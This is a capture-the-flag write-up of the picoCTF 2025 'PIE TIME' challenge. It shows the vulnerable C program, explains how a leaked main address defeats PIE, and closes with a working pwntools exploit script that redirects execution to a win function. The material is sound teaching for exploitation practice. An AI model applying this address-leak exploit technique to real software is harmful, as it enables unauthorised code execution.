## picoCTF 2025 PIE TIME binary exploitation challenge
A dive into an `easy` categorized binary exploitation challenge of picoCTF 2025 CTF.

## Reconnaissance
The challenge includes an elf `64-bit` executable file, with protections enabled: `FULL RELRO`,`Canary`, `PIE`.
This information can be gathered by running the commands below:
```
file vuln
```
```
checksec --file=vuln
``` 

We notice that PIE is enabled, which means that we cannot extract the base address of the executable file using tools like `objdump`, where the **whole program address** will be changed every time the executable file runs. This protection can be bypassed by leaking an already-known offset of an address where you do a simple subtraction operation to extract the base address:
```python
base_address = leaked_address - offset
``` 
We can get benefit of this address to get the address of the win function to return to it to print the flag.

## Vulnerability Analysis
```c
int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```
The program suffers from an Information Disclosure vulnerability because it prints the main function address directly.

As we mentioned before, PIE protection is enabled so we need to find a way to leak an address that we already know it's offset (how far is it from the base address), but look! program is already leaking the main function address!

The winning idea is to get the address of the win function address while the PIE protection is enabled, and to solve this we need to define what we need and what we have.

## Exploitation Strategy
**information that we got:**
1.  Main function address (leaked from program itself).
2.  Main function offset (can be retrieved using command: `objdump -M intel -d vuln | grep main`) e.g. value: `000000000000133d`.
3.  Win function offset (can be retrieved using command: `objdump -M intel -d vuln | grep win`) e.g. value: `00000000000012a7`.

**what we need:**
1. Win function actual address, which can be derived using equation:
```c++
win_address = base_address + win_offset
```

the address you get, you will submit it to be returned to win function then get the flag:

![Example of submitting win function address](images/pie-time/submission.png)

BOOM! you got the flag!

## Exploit
Exploitation can be automated using python `pwn` library:
```python
from pwn import *

p = remote("IP/DOMAIN", PORT)
#p = process("./vuln") # Alternative if you want to run solution locally

win_offset = 0x12a7
main_offset = 0x133d

# Get main address to extract base address
main_addr = int(p.recvline().split(b":")[1].strip(), 16)
print(f"[+] received main address: {hex(main_addr)}")

base_addr = main_addr - main_offset
print(f"[+] Extracted base address: {hex(base_addr)}")

win_addr = base_addr + win_offset

p.recvuntil(b"0x12345: ")

payload2 = str(hex(win_addr)).encode()
p.sendline(payload2)

# Print flag
print(p.recvall())
```